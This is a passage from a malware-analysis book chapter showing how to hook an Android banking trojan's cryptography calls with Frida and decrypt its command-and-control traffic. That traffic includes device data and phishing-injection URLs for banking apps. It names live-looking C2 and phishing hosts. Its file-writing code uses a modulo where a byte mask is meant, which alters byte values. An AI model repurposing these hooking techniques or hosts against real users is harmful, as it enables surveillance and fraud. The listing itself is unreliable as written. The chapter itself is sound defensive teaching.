  1223 ms  &lt;= [127,124,88,-42,38,53,-111,-46,-45,70,-89,-39,84,-32,-66,1]&#13;
           /* TID 0x164e */&#13;
  2150 ms  SecretKeySpec.$init([49,26,-127,53,-80,-83,-121,-50,35,-72,-79,-93,&#13;
                                -45,-113,43,31], 0, 16, "AES")&#13;
  2151 ms  Cipher.getInstance("AES_128/CBC/PKCS5PADDING")&#13;
  ...&#13;
  2158 ms  Cipher.init(2, "&lt;instance: java.security.Key,&#13;
                       $className: javax.crypto.spec.SecretKeySpec&gt;",&#13;
                       "&lt;instance: java.security.spec.AlgorithmParameterSpec, &#13;
                       $className: javax.crypto.spec.IvParameterSpec&gt;")&#13;
                       ...&#13;
    2163 ms  Cipher.doFinal([-26,104,-111,-55,-17,70,-86,-87,124,-117,14,&#13;
                             59,-29,42,-28,-3,51,40,-32,-1</pre>&#13;
<p class="list" id="ch4lis3"><span epub:type="pagebreak" id="page_129"/><em>Listing 4-3: The output of <span class="codeitalic1">frida-trace</span> related to cryptography APIs</em></p>&#13;
<p class="indent">This output gives us more leads to pursue later. We’ve confirmed that the app uses the default Java cryptography package, and we know some of the configuration parameters it uses for encryption.</p>&#13;
<p class="indent">In <a href="ch03.xhtml">Chapter 3</a>, we recommended that reverse engineers build a list of interesting API methods to search for when analyzing a program’s code. You can use this same list with <span class="literal">frida-trace</span> to intercept and log how mal-ware uses the APIs. Besides cryptography APIs, you might try to intercept those related to network communication, filesystem access, or access to sensitive data.</p>&#13;
<h4 class="h4" id="ch04lev1sec15"><strong><em>Finding Entry Points into the Malware with Frida Scripting</em></strong></h4>&#13;
<p class="noindent">The downside of <span class="literal">frida-trace</span> is that it can’t link the observed APIs to the malware’s code. We might know now that the malware uses encryption, and even how it sets up its ciphers, but we don’t know where this happens. To make this connection, we can use Frida scripting.</p>&#13;
<p class="indent">Scripting is likely Frida’s most useful capability. It allows Frida users to write custom code in different programming languages to interact with the program under observation. In this section, we’ll use this capability to connect API calls to the underlying malware’s code by observing the stack traces of interesting functions.</p>&#13;
<p class="indent">Using <span class="literal">frida-trace</span>, we learned that the malware calls the default Java cryptography API <span class="literal">Cipher.doFinal</span> to encrypt and decrypt data. We can now specifically target this API with a custom Frida script that discovers the locations in the malware that call the API. Written in JavaScript, <a href="ch04.xhtml#ch4lis4">Listing 4-4</a> is a very simple Frida script that intercepts the <span class="literal">Cipher.doFinal</span> API. Save it to a file called <em>xeno-dofinal.js</em>.</p>&#13;
<pre>Java.perform(() =&gt; {&#13;
  const Cipher = Java.use("javax.crypto.Cipher");&#13;
  Cipher.doFinal.overload('[B').implementation = function() {&#13;
    console.log("doFinal called from" );&#13;
    Java.perform(() =&gt; {&#13;
      console.log(Java.use("android.util.Log").getStackTraceString(&#13;
        Java.use("java.lang.Exception").$new()))&#13;
    });&#13;
&#13;
    return this.doFinal();&#13;
  };&#13;
});</pre>&#13;
<p class="list" id="ch4lis4"><em>Listing 4-4: A Frida script that intercepts the <span class="codeitalic1">doFinal</span> API</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_130"/>We use <span class="literal">Java.perform</span>, from Frida’s JavaScript API, to ensure that the current thread is attached to the virtual machine and then execute the function given in its argument. In our example, the provided function contains the code responsible for hooking <span class="literal">Cipher.doFinal</span>. Hooking a Java method first requires acquiring a JavaScript wrapper for its class. To do this, we use the Frida JavaScript API <span class="literal">Java.use</span>, which takes a fully qualified Java class name as its argument.</p>&#13;
<p class="indent">Before hooking and overwriting a method, we need to determine whether there are multiple methods with the same name in the hooked class. If so, we need to disambiguate them using the <span class="literal">overload</span> function, explicitly passing it the method parameters’ Java types. Here, we do this for the <span class="literal">doFinal</span> method by passing the argument <span class="literal">”[B”</span>, which indicates a byte array in Java type syntax.</p>&#13;
<p class="indent">Once we’ve found the correct overloaded method, we overwrite the object’s <span class="literal">implementation</span> property with the simple assignment of a custom function. Now, every time the app calls the hooked API, our code executes instead of the original API code. We also use an old Java trick to get our current location by throwing a new exception and printing its stack trace. Lastly, we return the expected value of <span class="literal">doFinal</span> by calling its original implementation.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>You can use jadx to help you intercept methods defined in the app under analysis. In the jadx context menu for method definitions or calls, select <strong>Copy as Frida Snippet</strong>. This creates Frida JavaScript that uses</em> <span class="codeitalic1">Java.use</span><em>, as we did in our script.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch04lev1sec16"><strong><em>Executing the Frida Script</em></strong></h4>&#13;
<p class="noindent">Execute the Frida script from the host machine’s command line:</p>&#13;
<pre>$ <span class="codestrong1">frida -U -f com.spike.old -l xeno-dofinal.js</span></pre>&#13;
<p class="indent">The <span class="literal">-U</span> argument instructs Frida to look for a device connected over USB, and the <span class="literal">-f</span> argument spawns the malware app. The <span class="literal">-l</span> argument specifies the script file to run. Once you run this command, the Frida shell should open and spawn the malware in a suspended state. To continue its execution, enter <span class="codestrong1">%resume</span> in the shell:</p>&#13;
<pre>[Android Emulator 5554::com.spike.old ]-&gt; <span class="codestrong1">%resume</span></pre>&#13;
<p class="indent"><a href="ch04.xhtml#ch4lis5">Listing 4-5</a> shows the script’s output. You should read this log from top to bottom. Each printed stack trace begins with <span class="literal">java.lang.Exception</span>, followed by the <span class="literal">doFinal</span> call under observation. After that, you’ll see the code snippet that calls <span class="literal">doFinal</span>.</p>&#13;
<pre>[Android Emulator 5554::com.spike.old ]-&gt; doFinal called from&#13;
java.lang.Exception&#13;
    at javax.crypto.Cipher.doFinal(Native Method)&#13;
    at com.sniff.sibling.UtilEncryption.encryptMessage(UtilEncryption.java:46)&#13;
    at com.sniff.sibling.Api.Bodies.ApiVerifyRequestBody$Builder.emplaceIdIv(&#13;
        <span epub:type="pagebreak" id="page_131"/>ApiVerifyRequestBody.java:72)&#13;
    at com.sniff.sibling.Api.Controllers.ApiVerifyController.sendRequest(&#13;
        ApiVerifyController.java:42)&#13;
    at com.sniff.sibling.Services.KingService.lambda$startService$1$&#13;
        com-securitypolicies-setup-Services-KingService(KingService.java:161)&#13;
        at com.sniff.sibling.Services.KingService$$&#13;
            ExternalSyntheticLambda1.run(Unknown Source:4)&#13;
    at java.util.concurrent.ThreadPoolExecutor.runWorker(&#13;
        ThreadPoolExecutor.java:1167)&#13;
    ...&#13;
&#13;
doFinal called from&#13;
java.lang.Exception&#13;
    at javax.crypto.Cipher.doFinal(Native Method)&#13;
    at com.sniff.sibling.UtilEncryption.decryptMessage(UtilEncryption.java:75)&#13;
    at com.sniff.sibling.Activities.AccessibilityEnableHintActivity.onStart(&#13;
        AccessibilityEnableHintActivity.java:68)&#13;
    at android.app.Instrumentation.callActivityOnStart(&#13;
        Instrumentation.java:1435)</pre>&#13;
<p class="list" id="ch4lis5"><em>Listing 4-5: The Frida script’s output shows places where</em> <span class="codeitalic1">doFinal</span> <em>is called.</em></p>&#13;
<p class="indent">The first stack trace shows the <span class="literal">encryptMessage</span> function, and the second shows <span class="literal">decryptMessage</span>. For the first time, we’re able to develop an understanding of the app’s control flow. The script’s output shows exactly how the <span class="literal">doFinal</span> method is called from the nonstandard <em>com.sniff</em> package, which must be the part of the malware that performs encryption.</p>&#13;
<p class="indent">To gain further insight into the malware, we could repeat this process for other interesting functions. For example, we might want to find where <em>ring0.xml</em> and <em>hq.json</em> are written to disk, and where the network connection to the command-and-control server is set up. We leave these tasks as an exercise for the reader.</p>&#13;
<h3 class="h3" id="ch04lev8"><strong>Decrypting the Command-and-Control Communications</strong></h3>&#13;
<p class="noindent">As in the previous chapter, one of the most important properties of the malware we’ll want to reverse engineer is its encrypted communication with the command-and-control server. Breaking the encryption will allow us to better understand the commands it supports. Rather than using static analysis and code reading to find out how this communication works, we’ll use dynamic analysis. Between tcpdump, logcat, and Frida, we have all the tools we need.</p>&#13;
<p class="indent">After our earlier analysis using tcpdump and Wireshark, we know that the first connection the malware makes is an HTTP POST request to <em>http://simpleyo5.tk/ping</em>. In this request, the malware sends a JSON object with four entries, as shown in <a href="ch04.xhtml#ch4lis6">Listing 4-6</a>.</p>&#13;
<pre>{&#13;
    "hash": "c9KjsZ9C7He6VRmwPMY9YpRrW8H9UFIITKB7umfOUyo=",&#13;
    "id": "9hbTqZU/XYXD8Z1hftmY0N63NltNY2+ihQOnUHrg9T1B/C...",&#13;
    <span epub:type="pagebreak" id="page_132"/>"iv": "M0KcSRwOMvKnbNd4TE719Q==",&#13;
    "type": "request_verify"&#13;
}</pre>&#13;
<p class="list" id="ch4lis6"><em>Listing 4-6: The JSON payload posted to the</em> /ping <em>URL</em></p>&#13;
<p class="indent">It’s still unclear what these values are. The one plaintext entry, <span class="literal">"type": "request_verify"</span>, suggests that the purpose of this connection is to request that the malware client be verified. We’ve shortened the value of <span class="literal">id</span> here; originally, it had more than 7,000 bytes. Its length indicates that it might be the message’s main payload. The value of <span class="literal">hash</span> is unknown at this point, as is the value of <span class="literal">iv</span>, which has a noteworthy name. Could this be the initialization vector used to encrypt the payload? Later, we’ll confirm this to be the case.</p>&#13;
<h4 class="h4" id="ch04lev1sec17"><strong><em>With CyberChef</em></strong></h4>&#13;
<p class="noindent">CyberChef (<a href="https://gchq.github.io/CyberChef"><em>https://gchq.github.io/CyberChef</em></a>) is an open source web app for encryption, encoding, compression, and data analysis. Developed by the Government Communications Headquarters (GCHQ), the British equivalent of the NSA, it is likely the most user-friendly way to manipulate, transform, and decrypt data during malware analysis. In this section, we’ll use it to play around with the malware’s encrypted communications protocol.</p>&#13;
<p class="indent"><a href="ch04.xhtml#ch4fig3">Figure 4-3</a> shows the CyberChef interface. In the upper-right corner, you can input plaintext data to transform. The bottom-right corner is an output field for the transformed data. On the left side, you can pick from dozens of data transformations to drag and drop into the center.</p>&#13;
<div class="image"><img id="ch4fig3" src="../images/ch04fig03.jpg" alt="Image" width="845" height="483"/></div>&#13;
<p class="figcap"><em>Figure 4-3:  Using CyberChef to get the hexadecimal byte values of a Base64-encoded string</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_133"/>In the example shown here, we’ve input the <span class="literal">iv</span> value from the JSON payload in the previous section. Then we chose two data transformations to apply: Base64 decoding and converting the result into a hex string. This outputs the string <span class="literal">33 42 9c 49 1c 0e 32 f2 a7 6c d7 78 4c 4e f5 f5</span>, which corresponds to the bytes of the <span class="literal">iv</span> value before it was Base64-encoded.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>CyberChef recipes can be much more complex than shown here, often using control flow operations, code disassembly, or YARA rules.</em></p>&#13;
</div>&#13;
<p class="indent">The Frida output told us that the malware uses AES encryption in its so-called CBC mode to encrypt and decrypt payloads. We need to recover the encryption keys and algorithm initialization vectors to successfully decrypt the payload. In the logcat logs, the JSON payload itself, and Frida’s output, we’ve encountered a couple of potential encryption keys and initialization vectors. In the next section, we’ll present a more structured approach to discovering these values, but for now, let’s use the IV from the JSON payload and the encryption key we found in the system log. We can use this information to complete the CyberChef recipe, making sure to pick the appropriate input formats for the payload, key, and IV (in our case, Raw, Hex, and Base64). <a href="ch04.xhtml#ch4fig4">Figure 4-4</a> shows the result.</p>&#13;
<div class="image"><img id="ch4fig4" src="../images/ch04fig04.jpg" alt="Image" width="845" height="542"/></div>&#13;
<p class="figcap"><em>Figure 4-4: Decrypting command-and-control communication with CyberChef</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_134"/>We’ve reproduced the decrypted JSON payload in its entirety in <a href="ch04.xhtml#ch4lis7">Listing 4-7</a>.</p>&#13;
<pre>{&#13;
    "api": 30,&#13;
    "apps": [&#13;
        "com.android.cts.priv.ctsshim",&#13;
        "com.android.internal.display.cutout.emulation.corner",&#13;
        "com.android.internal.display.cutout.emulation.double",&#13;
        "com.android.providers.telephony",&#13;
        "com.android.dynsystem",&#13;
        "com.android.theme.icon.pebble",&#13;
        "com.android.providers.calendar",&#13;
        ...&#13;
        "com.android.theme.icon_pack.circular.android"&#13;
    ],&#13;
    "imei": "f1b9bf329f36d7ee",&#13;
    "model": "Unknown Android SDK built for x86",&#13;
    "numbers": [&#13;
        "No numbers"&#13;
    ],&#13;
    "tag": "cleaner0902",&#13;
    "uid": "f1b9bf329f36d7ee"&#13;
}</pre>&#13;
<p class="list" id="ch4lis7"><em>Listing 4-7: The decrypted JSON payload posted to the</em> /ping <em>URL</em></p>&#13;
<p class="indent">The <span class="literal">api</span> field is likely the device’s Android API version (remember that we configured this to 30 at the beginning of this chapter). Next is a list of apps, presumably those installed on the system. The <span class="literal">imei</span> and <span class="literal">model</span> fields are probably the device’s IMEI number and device model. It’s unclear what <span class="literal">numbers</span> is, but it could be the device’s phone number or the phone numbers of contacts from the contact list. The <span class="literal">tag</span> field likely identifies the malware app itself, while <span class="literal">uid</span> could be some sort of unique user ID.</p>&#13;
<p class="indent">Of course, we now need to consider the data that the server returns. <a href="ch04.xhtml#ch4lis8">Listing 4-8</a> shows the response to the POST request.</p>&#13;
<pre>{&#13;
    "type": "reponse_verify",&#13;
    "hash": "6Judi7AChueoT88kb5yqRyA+LVY+AaRqMXPNtYAwl94=",&#13;
    "iv": "UyRedbVBUrUG+MEuIWSO8w==",&#13;
    "id": "8n7raTheyi0wb56/KGEpT03yrXARP1klA5c7s/1EMq8="&#13;
}</pre>&#13;
<p class="list" id="ch4lis8"><em>Listing 4-8: The JSON response received from the</em> /ping <em>URL</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_135"/>The <span class="literal">type</span> field’s value, <span class="literal">response_verify</span>, matches the POST payload’s <span class="literal">request_verify</span> field. The other three fields, <span class="literal">hash</span>, <span class="literal">id</span>, and <span class="literal">iv</span>, also match fields from the POST request. Their values are seemingly Base64-encoded.</p>&#13;
<p class="indent">An attempt to decrypt the <span class="literal">id</span> field with the previously used encryption key and IV value from the POST response doesn’t immediately produce a readable result. The decrypted value is a 16-byte array with seemingly random bytes. Their purpose and meaning are unclear for now. Likewise, we can’t easily decrypt the POST payloads of subsequent connections to the command-and-control server. We must strategically explore the malware in more depth.</p>&#13;
<h4 class="h4" id="ch04lev1sec18"><strong><em>With Frida</em></strong></h4>&#13;
<p class="noindent">To automate the interception and decryption of encrypted command-and-control communications, we can use Frida. In particular, we’ll develop a script that intercepts important Java encryption API methods and writes their inputs and outputs to files for later examination. To accomplish this, we’ll use some advanced Frida features.</p>&#13;
<p class="indent">Notably, rather than using the Frida command line to spawn the malware process, we’ll use a second script, the <em>control script</em>, to spawn the malware process and control its execution. The control script will inject another script, similar to the one we wrote earlier in this chapter, into that process.</p>&#13;
<h5 class="h5" id="ch04sec1sec1">The Control Script</h5>&#13;
<p class="noindent">Let’s begin by developing the control script, which spawns the malware app, attaches to it, injects the Frida script, and logs intercepted API arguments to disk. We’ve chosen to write it in Python to showcase Frida’s support for different scripting languages. Save this code to a file named <em>xeno.py</em>.</p>&#13;
<p class="indent"><a href="ch04.xhtml#ch4lis9">Listing 4-9</a> is the control script’s main function. It uses Frida Python bindings to interact with the Android emulator.</p>&#13;
<pre>import sys&#13;
import frida&#13;
&#13;
def main():&#13;
    emulator = frida.get_usb_device()&#13;
    pid = emulator.spawn('com.spike.old')&#13;
    session = emulator.attach(pid)&#13;
    inject_script(session)&#13;
    emulator.resume(pid)&#13;
    sys.stdin.read()&#13;
    session.detach()&#13;
&#13;
if __name__ == '__main__':&#13;
    main()</pre>&#13;
<p class="list" id="ch4lis9"><em>Listing 4-9: The control script’s main function</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_136"/>The main function connects to the Android emulator over USB, launches and attaches to the malware process, and gets its process ID. It uses the <span class="literal">inject_script</span> function to inject the Frida script into the malware process and then continues its execution, keeping the script alive until the user hits <small>CTRL</small>-C. <a href="ch04.xhtml#ch4lis10">Listing 4-10</a> shows the definition of <span class="literal">inject_script</span>.</p>&#13;
<pre>def inject_script(session):&#13;
&#13;
    def on_message(message, _):&#13;
        if message['type'] == 'send':&#13;
            if 'input' in message['payload']:&#13;
                write_data('iv', message['payload']['iv'])&#13;
                write_data('input', message['payload']['input'])&#13;
            elif 'output' in message['payload']:&#13;
                write_data('output', message['payload']['output'])&#13;
            elif 'key' in message['payload']:&#13;
                write_data('key', message['payload']['key'])&#13;
            else:&#13;
                print('Unknown message: ', message)&#13;
        else:&#13;
            print('Unknown message: ', message)&#13;
&#13;
    with open('xeno.js', 'r', encoding='utf8') as script_file:&#13;
        code = script_file.read()&#13;
&#13;
    script = session.create_script(code)&#13;
    script.on('message', on_message)&#13;
    script.load()</pre>&#13;
<p class="list" id="ch4lis10"><em>Listing 4-10: The control script’s process injection function</em></p>&#13;
<p class="indent">This function loads the Frida script file <em>xeno.js</em> (which you will find later in this chapter, in <a href="ch04.xhtml#ch4lis12">Listing 4-12</a>) into the malware process. Most importantly, it sets up the callback method <span class="literal">on_message</span>, which can receive messages from the Frida script inside the malware process. The format of these messages will become clearer once we discuss the injected script’s code. Generally, Frida’s default message format defines key/value pairs, with two default keys, <span class="literal">type</span> and <span class="literal">payload</span>. Our injected script overwrites the <span class="literal">payload</span> values with new key/value pairs. For each message, the key can be <span class="literal">iv</span>, <span class="literal">key</span>, <span class="literal">input</span>, or <span class="literal">output</span>, depending on the type of binary data in the value field.</p>&#13;
<p class="indent">Lastly, the control script defines the <span class="literal">write_data</span> function, which takes the intercepted data and writes it to multiple files (<a href="ch04.xhtml#ch4lis11">Listing 4-11</a>).</p>&#13;
<pre>import time&#13;
&#13;
def write_data(file_prefix, data):&#13;
    current_time = round(time.time() * 1000)&#13;
    filename = f'{current_time}_{file_prefix}.bin'&#13;
&#13;
    <span epub:type="pagebreak" id="page_137"/>print('Writing file:', filename)&#13;
&#13;
    with open(filename, 'wb') as output_file:&#13;
        output_file.write(bytearray((d % 0xFF for d in data)))</pre>&#13;
<p class="list" id="ch4lis11"><em>Listing 4-11: The control script’s file writing function</em></p>&#13;
<p class="indent">To preserve the chronological order in which the data was collected, this function writes each piece to a distinct file using a filename that contains the current time in milliseconds (ms) and the data type.</p>&#13;
<h5 class="h5" id="ch04sec1sec2">The Injected Script</h5>&#13;
<p class="noindent">The script that we inject into the malware process is much smaller. Its only job is to intercept Java cryptography APIs <span class="literal">SecretKeySpec</span> and <span class="literal">Cipher.doFinal</span> and send the data passed to them to the control script. <a href="ch04.xhtml#ch4lis12">Listing 4-12</a> shows this JavaScript script in its entirety.</p>&#13;
<pre>console.log("Loading Javascript");&#13;
&#13;
Java.perform(() =&gt; {&#13;
  const Cipher = Java.use("javax.crypto.Cipher");&#13;
&#13;
  Cipher.doFinal.overload('[B').implementation = function(arr) {&#13;
    send( {'input': arr, 'iv': this.getIV() });&#13;
&#13;
    const result = this.doFinal(arr);&#13;
&#13;
    send( {'output': result });&#13;
&#13;
    return result;&#13;
  };&#13;
&#13;
  const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");&#13;
  SecretKeySpec.$init.overload(&#13;
    "[B", "int", "int", "java.lang.String").implementation = function(&#13;
      arr, off, len, alg) {&#13;
    send( {'key': arr} );&#13;
    return this.$init(arr, off, len, alg);&#13;
  };&#13;
&#13;
});&#13;
&#13;
console.log("Javascript loaded");</pre>&#13;
<p class="list" id="ch4lis12"><em>Listing 4-12: The injected script</em> (xeno.js)</p>&#13;
<p class="indent">This script reuses key Frida scripting concepts, such as <span class="literal">Java.perform</span> and <span class="literal">Java.use</span>, discussed earlier in this chapter. It also sends messages to the control script, using the default Frida <span class="literal">send</span> method, to transmit the encryption keys, initialization vectors, and plaintext and ciphertext messages.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_138"/>Running the Python script should generate the following output:</p>&#13;
<pre>$ <span class="codestrong1">python3 xeno.py</span>&#13;
Loading Javascript&#13;
Javascript loaded&#13;
Writing file: 1651309456940_key.bin&#13;
Writing file: 1651309456997_iv.bin&#13;
Writing file: 1651309456997_input.bin&#13;
Writing file: 1651309457218_output.bin&#13;
Writing file: 1651309458430_key.bin&#13;
Writing file: 1651309458567_iv.bin&#13;
Writing file: 1651309458568_input.bin&#13;
Writing file: 1651309458682_output.bin</pre>&#13;
<p class="indent">As you can see, the script creates files containing encryption keys, initialization vectors, input arrays to encryption methods, and output arrays from encryption methods. Note that the code does not try to determine whether data is encrypted or decrypted, so the filenames don’t tell us whether we can find the unencrypted plaintext for cryptographic operations in the <em>input</em> or <em>output</em> files.</p>&#13;
<p class="indent">We can use the Linux command line tool xxd to dump hex values and ASCII representations of the content of the key and initialization vector files. You’ll notice that the first key is the one we’ve encountered on multiple occasions:</p>&#13;
<pre>$ <span class="codestrong1">xxd 1651309456940_key.bin</span>&#13;
00000000: 5f9d 4a91 b0d7 c7b8 8cb8 b6f7 f77f 0d2e  _.J.............</pre>&#13;
<p class="indent">By examining these files, we can discover that for outgoing network traffic the input file contains the unencrypted information that is then encrypted and sent to the command-and-control server. Likewise, for inbound traffic coming from the command-and-control server, the input file contains the received encrypted messages, and the output files contain the decrypted messages.</p>&#13;
<h3 class="h3" id="ch04lev9"><strong>Command-and-Control Server Messages</strong></h3>&#13;
<p class="noindent">While our Frida script provides information about the encrypted payloads, it doesn’t link the payloads to URL connections. However, unless we want to fully automate our analysis, it doesn’t have to. We’ve already logged the HTTP connections and their payloads with tcpdump and can look at them in Wireshark. Let’s compare the payloads from the files written to Frida with those visible in Wireshark. Because the malware makes very few connections to its server, it’s completely feasible to continue without automating this step.</p>&#13;
<h4 class="h4" id="ch04lev1sec19"><span epub:type="pagebreak" id="page_139"/><strong><em>The /ping URL</em></strong></h4>&#13;
<p class="noindent">When we dumped network traffic with tcpdump and Wireshark, we learned that the malware’s first connection is to <em>http://simpleyo5.tk/ping</em>. We also successfully decrypted its payload with information from Frida and logcat. The largest part of the payload was the list of installed apps. The server replied with a JSON payload of a similar format but much smaller size. Running tcpdump and Wireshark for longer does not seem to change this payload and response. While the app makes subsequent connections to this URL, it only seems to use this command to make the server aware of an available client.</p>&#13;
<h4 class="h4" id="ch04lev1sec20"><strong><em>The /metrics URL</em></strong></h4>&#13;
<p class="noindent">If you take another look at Wireshark, you’ll notice another URL to which the malware connects, and this one is much more interesting. After the first connection to <em>/ping</em>, the malware starts connecting to <em>http://simpleyo5.tk/metrics</em>. These connections are more frequent and have more diverse payloads in both directions.</p>&#13;
<p class="indent">In the first connection to the <em>/metrics</em> endpoint, the malware transmits a JSON file with plaintext keys and encrypted values that is similar to the one it transmits to <em>/ping</em>. For example, it could look like the one in <a href="ch04.xhtml#ch4lis13">Listing 4-13</a>.</p>&#13;
<pre>{&#13;
    "hash":"3E0+xCtHOl1sRkCb1GGS/VO3xFekCMw3aR8zrPLK44o=",&#13;
    "id":"IpDySYsxdURFmYsjS6EGkxE/ei7PsZfjjlz7OmFm5fc=",&#13;
    "iv":"mdPtTwJDHpVjIJPyhi7xxA==",&#13;
    "metrics":"Hfu92QtpMSbnGeWIiWC57rzdOvq3/+tXiF7D1uLb/YU="&#13;
}</pre>&#13;
<p class="list" id="ch4lis13"><em>Listing 4-13: The JSON payload posted to the</em> /metrics <em>URL for a</em> <span class="codeitalic1">jni_update</span> <em>command</em></p>&#13;
<p class="indent">The values in the fields <span class="literal">hash</span>, <span class="literal">id</span>, and <span class="literal">iv</span> likely play a role similar to the one they play in the payload to <em>/ping</em>. The <span class="literal">metrics</span> field is new and replaces the plaintext value of the <span class="literal">type</span> field sent to <em>/ping</em>.</p>&#13;
<p class="indent">It turns out that <span class="literal">metrics</span> decrypts to <span class="literal">{”type”:”inj_update”}</span>, which seems to be a simple request from the app to the server to receive information about “injections,” whatever that is. The server responds with a long message that decrypts to the JSON payload shown in <a href="ch04.xhtml#ch4lis14">Listing 4-14</a>.</p>&#13;
<pre>{&#13;
    'type': 'inj_update',&#13;
    'injections': [&#13;
        {&#13;
            'app': 'ca.mobile.explorer',&#13;
            'url': 'https://homeandofficedeal.com/local/pt/ca.mobile.explorer.html'&#13;
        },&#13;
        {&#13;
            'app': 'cgd.pt.caixadirectaparticulares',&#13;
            'url': 'https://homeandofficedeal.com/local/pt/&#13;
                    <span epub:type="pagebreak" id="page_140"/>cgd.pt.caixadirectaparticulares.html'&#13;
        },&#13;
        {&#13;
            'app': 'com.abanca.bm.pt',&#13;
            'url': 'https://homeandofficedeal.com/local/pt/com.abanca.bm.pt.html'&#13;
        },&#13;
        ...&#13;
}</pre>&#13;
<p class="list" id="ch4lis14"><em>Listing 4-14: The decrypted JSON response from the</em> /metrics <em>URL</em></p>&#13;
<p class="indent">This long list of app package names and URLs is interesting. Today, these URLs are long gone, but we explored them in a previous analysis and can present them here. Each HTML file is a phishing page for a different legitimate app. The screenshot in <a href="ch04.xhtml#ch4fig5">Figure 4-5</a> shows the phishing page associated with <em>com.android.vending</em>, the package name of the Google Play app.</p>&#13;
<div class="image"><img id="ch4fig5" src="../images/ch04fig05.jpg" alt="Image" width="547" height="433"/></div>&#13;
<p class="figcap"><em>Figure 4-5: An input field to phish credit card information in Google Play</em></p>&#13;
<p class="indent">In addition to <span class="literal">inj_update</span>, the <em>/metrics</em> URL can also receive at least one other command. On a subsequent connection, the malware sends it a command called <span class="literal">get_coms</span> whose payload is shown in <a href="ch04.xhtml#ch4lis15">Listing 4-15</a>.</p>&#13;
<pre>{&#13;
    "permissions": ["notification_manager","generic_permissions"],&#13;
    "rm_triggered":false,&#13;
    "user_present":true,&#13;
    "type":"get_coms"&#13;
}</pre>&#13;
<p class="list" id="ch4lis15"><em>Listing 4-15: A decrypted JSON payload posted to the</em> /metrics <em>URL for a</em> <span class="codeitalic1">get_coms</span> <em>command</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_141"/>Besides the <span class="literal">type</span> field indicating the message type, only the <span class="literal">user_present</span> field seems self-explanatory. It’s not clear what <span class="literal">rm_triggered</span> refers to, and the exact meaning of the <span class="literal">permissions</span> field also remains mysterious. We do get an additional hint, though, that the app cares about app notifications.</p>&#13;
<p class="indent">In our tests, <span class="literal">get_coms</span> was by far the most common command sent to the server. Unfortunately, the only response we observed was the empty payload <span class="literal">{'type': 'get_coms', 'coms': []}</span>. By the time we attempted an in-depth analysis, the command-and-control servers had been shut down, so we had to use the payloads previously collected in our malware scanner archives to reason about the malware behavior.</p>&#13;
<h4 class="h4" id="ch04lev1sec21"><strong><em>The Rotating Encryption Keys</em></strong></h4>&#13;
<p class="noindent">Readers who have meticulously followed along with this app analysis on their computers may have noticed that the malware changes encryption keys. You can observe this when the Frida script logs different values into the key files, but it becomes increasingly obvious when you try to manually decrypt payloads with CyberChef.</p>&#13;
<p class="indent">The encryption key we discovered earlier, <span class="literal">5f 9e 4a 92 b1 d8 c8 b9 8d b9 b7 f8 f8 80 0d 2e</span>, is used for only the initial command-and-control server communications during the first connection to the <em>/ping</em> URL. Recall that the <em>/ping</em> reply payload contains a JSON field called <span class="literal">id</span>. This field holds the new encryption key. The field is itself encrypted, but we can decrypt it using the original key and the initialization vector from the reply’s <span class="literal">iv</span> field.</p>&#13;
<p class="indent">It turns out that the app also logs this new key into the system log. We can retrieve it using logcat:</p>&#13;
<pre>$ <span class="codestrong1">adb logcat | grep "Client verified"</span>&#13;
16:18:07.150 D/pioneer_bridge_over_white_rabbits &#13;
    (setVerification)( 9686): Client verified: uV+VcJoWRYP79riYnZvmUw==&#13;
16:20:16.716 D/pioneer_bridge_over_white_rabbits&#13;
    (setVerification)(11030): Client verified: pwp4tia4GyVyhuB7Z8HYsA==</pre>&#13;
<p class="indent">The Base64-encrypted value at the end of each log line is the new encryption key. The log also shows that the encryption key further rotates, presumably with each call to <em>/ping</em>, as between any two calls to <em>/ping</em> the key seems to remain stable.</p>&#13;
<h3 class="h3" id="ch04lev10"><strong>Other Malware Functionality</strong></h3>&#13;
<p class="noindent">Running the app and inspecting its command-and-control messages has given us several leads to pursue. We know that the app wants to acquire the permission to use the accessibility API, cares about installed apps, and is interested in notification listener permissions. Let’s use this information to dig deeper.</p>&#13;
<h4 class="h4" id="ch04lev1sec22"><span epub:type="pagebreak" id="page_142"/><strong><em>com.sniff with frida-trace</em></strong></h4>&#13;
<p class="noindent">On several occasions, our analysis has confirmed the presence of a Java package named <em>com.sniff</em> . One of the next steps we could take is to explore this package with Frida.</p>&#13;
<p class="indent">You might naively try to use <span class="literal">frida-trace</span> to intercept all methods in this package and log their usage, arguments, and return values. However, if you simply run a command similar to the one we used to intercept the cryptography APIs earlier in this chapter, this won’t work well, as you can see here:</p>&#13;
<pre>$ <span class="codestrong1">frida-trace -U -j 'com.sniff*!*' -f com.spike.old</span>&#13;
Instrumenting...                                                        &#13;
MainApplication.$init: Loaded handler at&#13;
    "__handlers__/com.sniff.sibling.MainApplication/_init.js"&#13;
MainApplication.getContext: Loaded handler at&#13;
    "__handlers__/com.sniff.sibling.MainApplication/getContext.js"&#13;
MainApplication.getInstance: Loaded handler at&#13;
    "__handlers__/com.sniff.sibling.MainApplication/getInstance.js"&#13;
MainApplication.onCreate: Loaded handler at&#13;
    "__handlers__/com.sniff.sibling.MainApplication/onCreate.js"&#13;
Started tracing 4 functions. Press Ctrl+C to stop.</pre>&#13;
<p class="indent">As shown in the output, Frida can find only four methods in the <span class="literal">MainApplication</span> class. This happens because the Java class loader hasn’t finished loading all of the app’s classes by the time <span class="literal">frida-trace</span> enumerates the loaded classes.</p>&#13;
